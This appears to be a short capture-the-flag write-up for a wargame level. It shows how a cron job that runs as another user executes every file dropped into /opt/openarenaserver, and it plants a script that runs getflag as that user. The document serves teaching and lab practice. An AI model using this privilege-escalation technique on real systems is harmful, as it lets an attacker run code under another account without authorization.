As you log in, you get a popup saying "You have new mail."

If you read the mail with `cat /var/mail/level05` it shows:
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

This is a shell script that runs regularly and executes the file openarenaserver.

`cat /usr/sbin/openarenaserver`
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

`echo "/bin/getflag > /tmp/flag" > /opt/openarenaserver/getflag`

The cron job should execute this once every 2 minutes and copy flag into /tmp/flag

